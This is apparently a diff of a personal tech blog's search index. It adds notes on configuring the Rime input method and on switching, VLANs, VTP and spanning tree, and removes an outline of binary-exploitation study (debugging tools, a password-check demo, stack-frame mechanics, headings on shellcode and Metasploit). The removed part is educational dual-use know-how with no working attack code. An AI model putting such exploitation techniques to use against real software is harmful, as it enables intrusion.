+<h2 id="记录用户写作习惯的文件"><a href="#记录用户写作习惯的文件" class="headerlink" title="记录用户写作习惯的文件"></a>记录用户写作习惯的文件</h2><pre><code>• ※〔用戶詞典〕 &lt;词典名&gt;.userdb.kct
+• ※〔用戶詞典快照〕 &lt;词典名&gt;.userdb.txt、&lt;词典名&gt;.userdb.kct.snapshot 見於同步文件夾
+</code></pre>
+<h2 id="用户自己设定的"><a href="#用户自己设定的" class="headerlink" title="用户自己设定的"></a>用户自己设定的</h2><pre><code>• ※〔用戶對全局設定的定製信息〕 default.custom.yaml
+• ※〔用戶對預設輸入方案的定製信息〕 &lt;方案标识&gt;.custom.yaml
+• ※〔用戶自製輸入方案〕及配套的詞典源文件
+</code></pre>
+<p>注：以上标有 ※ 号的文件，包含用户资料，清理文件时要注意备份！</p>
+<h1 id="词库管理"><a href="#词库管理" class="headerlink" title="词库管理"></a>词库管理</h1><ol>
+<li>导入搜狗词库：<ol>
+<li>luna_pinyinn.sogou.dict.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rime dictionary</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">---</span><br><span class="line">name: luna_pinyin.sogou</span><br><span class="line">version: <span class="string">&quot;2015.12.24&quot;</span></span><br><span class="line">sort: by_weight</span><br><span class="line">use_preset_vocabulary: true</span><br><span class="line">import_tables:</span><br><span class="line">  - luna_pinyin</span><br><span class="line">...</span><br><span class="line"><span class="comment">#######后面为词库内容#########</span></span><br></pre></td></tr></table></figure></li>
+<li>luna_pinyin_simp.custom.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">translator/dictionary: luna_pinyin.sogou  <span class="comment">#导入搜狗词库</span></span><br></pre></td></tr></table></figure></li>
 </ol>
 </li>
 </ol>
-<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
-<li><p>OllyDbg</p>
-</li>
-<li><p>SoftICE</p>
-</li>
-<li><p>WinDbg</p>
-</li>
-<li><p>IDE Pro</p>
-</li>
-<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
-</li>
-<li><p>虚拟机</p>
-</li>
-<li><p>Crack二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<p>2.特殊字符定义：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;recognizer/patterns/punct&#x27;</span>: <span class="string">&quot;^/[a-z]*$&quot;</span>  <span class="comment">#可以使symbols中的‘/hj’‘/fh’等命令</span></span><br><span class="line"><span class="string">&#x27;punctuator/import_preset&#x27;</span>: symbols       <span class="comment">#将标点设置默认为&#x27;symbols.yaml&#x27;文件</span></span><br><span class="line"><span class="string">&quot;switches/@0/reset&quot;</span>: <span class="number">1</span>  <span class="comment"># 初始的 ascii mode 设置为「西文」</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>糢糊音定义：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;speller/algebra&#x27;</span>:</span><br><span class="line">    - erase/^xx$/                      <span class="comment"># 第一行保留</span></span><br><span class="line">    <span class="comment"># 模糊音定義</span></span><br><span class="line">    <span class="comment"># 需要哪組就刪去行首的 # 號，單雙向任選</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])h/$1/             # zh, ch, sh =&gt; z, c, s</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])([^h])/$1h$2/     # z, c, s =&gt; zh, ch, sh</span></span><br><span class="line">    <span class="comment">#- derive/^n/l/                     # n =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^l/n/                     # l =&gt; n</span></span><br><span class="line">    <span class="comment"># 這兩組一般是單向的</span></span><br><span class="line">    <span class="comment">#- derive/^r/l/                     # r =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^ren/yin/                 # ren =&gt; yin, reng =&gt; ying</span></span><br><span class="line">    <span class="comment">#- derive/^r/y/                     # r =&gt; y</span></span><br><span class="line">    <span class="comment"># 下面 hu &lt;=&gt; f 這組寫法複雜一些，分情況討論</span></span><br><span class="line">    <span class="comment">#- derive/^hu$/fu/                  # hu =&gt; fu</span></span><br><span class="line">    - derive/^hong$/feng/              <span class="comment"># hong =&gt; feng</span></span><br><span class="line">    - derive/^hu([<span class="keyword">in</span>])$/fe$<span class="number">1</span>/          <span class="comment"># hui =&gt; fei, hun =&gt; fen</span></span><br><span class="line">    <span class="comment">#- derive/^hu([ao])/f$1/            # hua =&gt; fa, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fu$/hu/                  # fu =&gt; hu</span></span><br><span class="line">    - derive/^feng$/hong/              <span class="comment"># feng =&gt; hong</span></span><br><span class="line">    <span class="comment">#- derive/^fe([in])$/hu$1/          # fei =&gt; hui, fen =&gt; hun</span></span><br><span class="line">    <span class="comment">#- derive/^f([ao])/hu$1/            # fa =&gt; hua, ...</span></span><br><span class="line">    <span class="comment"># 韻母部份</span></span><br><span class="line">    <span class="comment">#- derive/^([bpmf])eng$/$1ong/      # meng = mong, ...</span></span><br><span class="line">    - derive/([ei])n$/$1ng/            <span class="comment"># en =&gt; eng, in =&gt; ing</span></span><br><span class="line">    - derive/([ei])ng$/$1n/            <span class="comment"># eng =&gt; en, ing =&gt; in</span></span><br><span class="line">    - derive/^un/iong/                 <span class="comment"># un =&gt; iong</span></span><br><span class="line">    - derive/^iong/un/                 <span class="comment"># iong =&gt; un</span></span><br><span class="line">    <span class="comment"># 樣例足夠了，其他請自己總結……</span></span><br><span class="line">    <span class="comment"># 反模糊音？</span></span><br><span class="line">    <span class="comment"># 誰說方言沒有普通話精確、有模糊音，就能有反模糊音。</span></span><br><span class="line">    <span class="comment"># 示例爲分尖團的中原官話：</span></span><br><span class="line">    <span class="comment">#- derive/^ji$/zii/   # 在設計者安排下鳩佔鵲巢，尖音i只好雙寫了</span></span><br><span class="line">    <span class="comment">#- derive/^qi$/cii/</span></span><br><span class="line">    <span class="comment">#- derive/^xi$/sii/</span></span><br><span class="line">    <span class="comment">#- derive/^ji/zi/</span></span><br><span class="line">    <span class="comment">#- derive/^qi/ci/</span></span><br><span class="line">    <span class="comment">#- derive/^xi/si/</span></span><br><span class="line">    <span class="comment">#- derive/^ju/zv/</span></span><br><span class="line">    <span class="comment">#- derive/^qu/cv/</span></span><br><span class="line">    <span class="comment">#- derive/^xu/sv/</span></span><br><span class="line">    <span class="comment"># 韻母部份，只能從大面上覆蓋</span></span><br><span class="line">    <span class="comment">#- derive/^([bpm])o$/$1eh/          # bo =&gt; beh, ...</span></span><br><span class="line">    <span class="comment">#- derive/(^|[dtnlgkhzcs]h?)e$/$1eh/  # ge =&gt; geh, se =&gt; sheh, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])uo$/$1ue/         # guo =&gt; gue, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])e$/$1uo/          # he =&gt; huo, ...</span></span><br><span class="line">    <span class="comment">#- derive/([uv])e$/$1o/             # jue =&gt; juo, lve =&gt; lvo, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fei$/fi/                 # fei =&gt; fi</span></span><br><span class="line">    <span class="comment">#- derive/^wei$/vi/                 # wei =&gt; vi</span></span><br><span class="line">    <span class="comment">#- derive/^([nl])ei$/$1ui/          # nei =&gt; nui, lei =&gt; lui</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])un$/$1vn/       # lun =&gt; lvn, zun =&gt; zvn, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])ong$/$1iong/    # long =&gt; liong, song =&gt; siong, ...</span></span><br><span class="line">    <span class="comment"># 這個辦法雖從拼寫上做出了區分，然而受詞典制約，候選字仍是混的。</span></span><br><span class="line">    <span class="comment"># 只有真正的方音輸入方案纔能做到！但「反模糊音」這個玩法快速而有效！</span></span><br><span class="line">    <span class="comment"># 模糊音定義先於簡拼定義，方可令簡拼支持以上模糊音</span></span><br><span class="line">    - abbrev/^([a-z]).+$/$<span class="number">1</span>/           <span class="comment"># 簡拼（首字母）</span></span><br><span class="line">    - abbrev/^([zcs]h).+$/$<span class="number">1</span>/          <span class="comment"># 簡拼（zh, ch, sh）</span></span><br><span class="line">    <span class="comment"># 以下是一組容錯拼寫，《漢語拼音》方案以前者爲正</span></span><br><span class="line">    - derive/^([nl])ve$/$1ue/          <span class="comment"># nve = nue, lve = lue</span></span><br><span class="line">    - derive/^([jqxy])u/$1v/           <span class="comment"># ju = jv,</span></span><br><span class="line">    - derive/un$/uen/                  <span class="comment"># gun = guen,</span></span><br><span class="line">    - derive/ui$/uei/                  <span class="comment"># gui = guei,</span></span><br><span class="line">    - derive/iu$/iou/                  <span class="comment"># jiu = jiou,</span></span><br><span class="line">    <span class="comment"># 自動糾正一些常見的按鍵錯誤</span></span><br><span class="line">    - derive/([aeiou])ng$/$1gn/        <span class="comment"># dagn =&gt; dang</span></span><br><span class="line">    - derive/([dtngkhrzcs])o(u|ng)$/$1o/  <span class="comment"># zho =&gt; zhong|zhou</span></span><br><span class="line">    - derive/ong$/on/                  <span class="comment"># zhonguo =&gt; zhong guo</span></span><br><span class="line">    - derive/ao$/oa/                   <span class="comment"># hoa =&gt; hao</span></span><br><span class="line">    - derive/([iu])a(o|ng?)$/a$<span class="number">1</span>$<span class="number">2</span>/    <span class="comment"># tain =&gt; tian</span></span><br><span class="line">  <span class="comment"># 分尖團後 v =&gt; ü 的改寫條件也要相應地擴充：</span></span><br><span class="line">  <span class="comment">#&#x27;translator/preedit_format&#x27;:</span></span><br><span class="line">  <span class="comment">#  - &quot;xform/([nljqxyzcs])v/$1ü/&quot;</span></span><br></pre></td></tr></table></figure></li>
 </ol>
-<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
-<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
-<li>代码区：cpu在此区域取值执行</li>
-<li>数据区：存储全局变量等</li>
-<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
-<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
-</ol>
-</li>
-<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
-<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
-<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
-<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
-<li>局部变量：为函数局部变量开辟内存空间</li>
-<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
-<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
-</ol>
-</li>
-<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
-</ol>
-</li>
-<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
-</ol>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>C</th>
-<th>SysCall</th>
-<th>StdCall</th>
-<th>BASIC</th>
-<th>FORTRAN</th>
-<th>PASCAL</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>参数入栈顺序</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>右-&gt;左</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-<td>左-&gt;右</td>
-</tr>
-<tr>
-<td>恢复栈平衡操作的位置</td>
-<td>母函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-<td>子函数</td>
-</tr>
-</tbody></table>
-<ol start="4">
-<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
-<li>参数入栈：按入栈顺序</li>
-<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
-<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
-<li>栈帧调整：<ol>
-<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
-<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
-<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
-</ol>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
-</li>
-<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
-<li>保存返回值：通常保存在寄存器EAX</li>
-<li>弹出当前栈帧，恢复上一个栈帧<ol>
-<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
-<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
-<li>将函数返回地址弹给EIP寄存器</li>
-</ol>
-</li>
-<li>跳转：按照返回地址跳回母函数继续执行</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>PWN</category>
-      </categories>
+]]></content>
       <tags>
-        <tag>网络空间安全</tag>
-        <tag>安全漏洞</tag>
-        <tag>0day</tag>
-        <tag>Stack overflow</tag>
+        <tag>tools</tag>
+        <tag>open source</tag>
       </tags>
   </entry>
   <entry>
@@ -2732,6 +2732,348 @@
       <tags>
         <tag>Linux</tag>
         <tag>Shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SWITCH &amp; ROUTER</title>
+    <url>/2022/03/24/%E8%B7%AF%E7%94%B1%E4%B8%8E%E4%BA%A4%E6%8D%A2%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><ol>
+<li>交换机switch的基本功能<ol>
+<li>学习功能</li>
+<li>转发&#x2F;过滤</li>
+<li>支持冗余链路</li>
+<li>对VLAN（虚拟局域网）的支持</li>
+</ol>
+</li>
+<li>二层结构交换机特点：数据链路层，无三层口，需要虚拟接口vlan（vlan 1为默认管理接口，默认所有端口都在vlan1） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Switch&gt;enable </span><br><span class="line">Switch#configure terminal</span><br><span class="line">SwitchA (config-if)# no shutdown  	//开启</span><br></pre></td></tr></table></figure></li>
+<li>交换机分类：<ol>
+<li>按架构特点<br> a. 机架式、带扩展槽固定配置式、不带扩展槽固定配置式</li>
+<li>按应用规模</li>
+<li>按传输介质和传输速度</li>
+<li>按OSI的分层结构</li>
+</ol>
+</li>
+<li>二层交换机工作原理<ol>
+<li>根据收到数据帧总的源mac建立地址同交换机端口的映射，并将其写入mac地址表中</li>
+<li>交换机根据数据帧中的mac地址同已建立的mac地址表比较，在决定由哪个端口转发<ol>
+<li>目的mac地址不在mac表中，则向所有端口转发（广播）</li>
+<li>广播帧和组播帧向所有的端口转发</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>交换机交换方式：<ol>
+<li>直通</li>
+<li>存储转发</li>
+<li>碎片隔离</li>
+</ol>
+</li>
+<li>交换机的级联和堆叠<ol>
+<li>级联『分开配置』<ol>
+<li>使用Uplink端口级联</li>
+<li>使用普通端口级联</li>
+</ol>
+</li>
+<li>堆叠『总体配置』<ol>
+<li>菊花链式堆叠（类似：RAID冗余磁盘阵列）</li>
+<li>星型堆叠</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>交换机管理模式<ol>
+<li>超级终端管理模式<ul>
+<li>console口链接交换机（配置线DB9-to-DB9）</li>
+<li>波特率9600，数据位8</li>
+</ul>
+</li>
+<li>Telnet管理模式<ol>
+<li>相关配置 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">switchA(config)<span class="meta"># <span class="keyword">line</span> vty 0 4  <span class="comment">// 指同时允许5个虚拟终端登陆进行配置</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># password pwd1   <span class="comment">//password</span></span></span><br><span class="line">switchA(config-line)<span class="meta"># login  <span class="comment">//启用密码认证，默认关闭</span></span></span><br></pre></td></tr></table></figure></li>
+<li>配置登录密码： <figure class="highlight c"><figcaption><span>isco</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 1 0 pwd1  </span></span><br><span class="line"><span class="comment">// secret：MD5加密；</span></span><br><span class="line"><span class="comment">// level：指定密码用于哪个级别；</span></span><br><span class="line"><span class="comment">// 1：用户模式；</span></span><br><span class="line"><span class="comment">// 0：即将输入初始密码（5：cisco的MD5值）</span></span><br></pre></td></tr></table></figure></li>
+<li>配置特权模式口令 <figure class="highlight c"><figcaption><span>isco switch</span></figcaption><table><tr><td class="code"><pre><span class="line">SwitchA (config)<span class="meta"># enable secret level 14 0 pwd2</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>Web管理模式<h1 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h1></li>
+</ol>
+</li>
+<li><h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><ol>
+<li>vlan的优点<ol>
+<li>限制网络上的广播，有助于控制流量</li>
+<li>降低成本</li>
+<li>简化网络管理，提高网络连接灵活性</li>
+<li>增强局域网安全性</li>
+</ol>
+</li>
+<li>Vlan划分方式类型<ol>
+<li>静态vlan：基于端口vlan，即指名各端口属于哪个vlan<ul>
+<li><pre><code>基于端口的vlan缺点
+</code></pre>
+<ol>
+<li>安全问题：物理攻击</li>
+<li>灵活性差，配置便捷性差</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>动态vlan：MAC based VLAN、Subnet based VLAN、User Based VLAN</li>
+</ol>
+</li>
+<li>VLAN配置相关参数<ul>
+<li>access：主机连交换机、终端</li>
+<li>trunk：交换机互联</li>
+<li>range： 范围    </li>
+<li>PVID：（port vlan id）端口的vlanID号</li>
+</ul>
+</li>
+<li>IEEE802.1Q：<ol>
+<li>封装：将VLAN信息加入数据帧的包头，据有加标记能力的端口将会执行封装</li>
+<li>去封装：VLAN信息从数据帧头去掉，具有去封装能力的端口将会执行解封装<br> <img src="/:/d3d834ddc68a463782df866e5ee281d7" alt="64aac2f1d32778beaa3638d2943075ed.png"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><h2 id="VTP-VLAN-Trunking-Protocol-思科私有协议"><a href="#VTP-VLAN-Trunking-Protocol-思科私有协议" class="headerlink" title="VTP (VLAN Trunking Protocol 思科私有协议)"></a>VTP (VLAN Trunking Protocol 思科私有协议)</h2><ul>
+<li>VTP：VLAN中继协议 &#x2F; 虚拟局域网干道协议 （配置统一性：对VLAN进行统一管理）</li>
+<li>三种工作模式：<ol>
+<li>&#x3D;&#x3D;VTP Server&#x3D;&#x3D;：<ul>
+<li>可建删修改vlan</li>
+<li>可发送并转发相关通告信息，同步vlan配置</li>
+<li>配置保存在NVRAM</li>
+</ul>
+</li>
+<li>VTP Client ：<ul>
+<li>不可建删修改vlan</li>
+<li>但可转发通告、同步</li>
+<li>不保存配置到NVRAM</li>
+</ul>
+</li>
+<li>VTP Transparent：相当于独立的交换机，不参与vtp工作，不从vtp server学习，只拥有本设备上自维护的vlan信息</li>
+</ol>
+</li>
+</ul>
+<ol>
+<li>VTP相关操作<ol>
+<li>前置配置：trunk <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># switchport mode trunk</span><br></pre></td></tr></table></figure></li>
+<li>协议配置 <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp mode &#123;server|client|transparent&#125;	//配置vtp模式</span><br><span class="line"># vtp domain &#123;test&#125;	//配置域名，默认为空</span><br><span class="line"># vtp password &#123;cisco&#125;	//配置pwd</span><br><span class="line"># vtp version 2	//配置version</span><br></pre></td></tr></table></figure></li>
+<li>vtp裁减  <figure class="highlight plaintext"><figcaption><span>switch</span></figcaption><table><tr><td class="code"><pre><span class="line"># vtp purning	//启用裁减，只需在server上配置</span><br></pre></td></tr></table></figure></li>
+</ol>
+<ul>
+<li>显示信息：<code>show vtp status</code><h1 id="网络优化-amp-安全策略"><a href="#网络优化-amp-安全策略" class="headerlink" title="网络优化 &amp; 安全策略"></a>网络优化 &amp; 安全策略</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+<li><h2 id="生成树协议（STP）"><a href="#生成树协议（STP）" class="headerlink" title="生成树协议（STP）"></a>生成树协议（STP）</h2><ul>
+<li>STA：生成树算法</li>
+<li>BPDU：桥接协议数据单元（Bridge Protocol Data Unit）「两层」<ol>
+<li>版本号 00（IEEE802.1D）；02（IEEE802.1w）</li>
+<li>Bridge ID：交换机ID &#x3D; 交换机优先级 + 交换机mac地址</li>
+<li>Root ID：桥ID最小的位根ID</li>
+<li>Root Path Cost：到达根的路径开销</li>
+<li>PortID</li>
+<li>Hello Time：定期发送BPDU的时间间隔</li>
+<li>Max-Age Time：保留对方BPDU的时间间隔</li>
+<li>Forward-Delay Time发送延迟：端口状态改变的时间间隔</li>
+</ol>
+</li>
+<li>BID：网桥ID（Bridge ID）</li>
+<li>Root Bridge：根网桥（桥ID最小）</li>
+<li>Root Ports：根端口（到达根桥最佳路径）</li>
+<li>Designated Ports：指定端口</li>
+<li>Alternated Port：可选端口（既不是指定端口也不是根端口）</li>
+</ul>
+<ol>
+<li>生成树协议端口状态<ol>
+<li>禁用(Disabled)：关闭端口</li>
+<li>阻塞(Blocking)：不能接收或传输数据，不能吧mac地址加入地址表，只接收BPDU</li>
+<li>监听(Listening)：由根端口和指定端口担任，不能转发和传输，不能mac加入地址表，只能接收或发送BPDU</li>
+<li>学习(Learning)</li>
+<li>转发(Forwarding)</li>
+</ol>
+</li>
+<li>生成树协议配置<ol>
+<li>交换机优先级</li>
+<li>端口优先级</li>
+<li>配置HelloTime</li>
+<li>配置Forward-Delay Time</li>
+<li>配置Max-AgeTime</li>
+</ol>
+<ul>
+<li>Cisco系列SpanningTree默认配置：（# spanning-tree reset）<ul>
+<li>生成树协议PVST</li>
+<li>STP启用</li>
+<li>STP Proority：32768</li>
+<li>STP port Priority：128</li>
+<li>STP port cost：根据端口速率自动判断</li>
+<li>Hello Time：2s</li>
+<li>Forward-delay Time：15s</li>
+<li>Max-age Time：20s</li>
+</ul>
+<ol>
+<li>启用生成树协议</li>
+<li>关闭生成树协议</li>
+<li>配置生成树协议类型</li>
+<li>配置交换机优先级 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># spanning-tree priority 4096</span></span><br></pre></td></tr></table></figure></li>
+<li>优先级恢复默认值</li>
+<li>配置交换机端口优先级</li>
+<li>显示生成树状态</li>
+<li>显示端口生成树协议状态</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>快速生成树协议（RSTP）：生成树改进，解决收敛慢问题<ol>
+<li>改进方案<ol>
+<li>为根端口和指定端口设置了快速切换用的替换端口（Alternate Port）和备份端口（Backup Port）</li>
+<li>在只连接了两个交换端口的点对点链路中，指定端口只需与下游交换机进行一次握手就可以无时延地进入转发状态</li>
+<li>直接与终端相连而不是把其他交换机相连的端口定义为边缘端口（Edge Port）。边缘端口可以直接进入转发状态，不需要任何延时。</li>
+</ol>
+</li>
+<li>端口三种状态<ol>
+<li>Discarding</li>
+<li>Learning</li>
+<li>Forwarding</li>
+</ol>
+<ul>
+<li>对比一般生成树少了监听listening和阻塞blocking</li>
+</ul>
+</li>
+<li>基于vlan的RSTP <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># show spanning-tree vlan 20</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>多生成树（MSTP）</li>
+</ol>
+</li>
+<li><h2 id="端口聚合（Ethernet-Channel-以太通道）"><a href="#端口聚合（Ethernet-Channel-以太通道）" class="headerlink" title="端口聚合（Ethernet Channel 以太通道）"></a>端口聚合（Ethernet Channel 以太通道）</h2><ul>
+<li>一组物理端口联合成一个逻辑通道，即通道组，此逻辑通道视作一个端口</li>
+<li>自动提供冗余和负载均衡</li>
+</ul>
+<ol>
+<li>端口聚合类型<ol>
+<li>手工静态配置</li>
+<li>动态协议聚合<ol>
+<li>PAgA（思科私有）<ul>
+<li>On：通道成员不协商，直接开启端口聚合（静态）</li>
+<li>auto：主动</li>
+<li>desirable：被动协商，不发送，只接受协商消息</li>
+<li>Off：关闭</li>
+</ul>
+</li>
+<li>LACP<ul>
+<li>active：主动</li>
+<li>passive：被动协商，不发送，只接受协商消息</li>
+<li>On</li>
+<li>Off</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>链路聚合配置<ul>
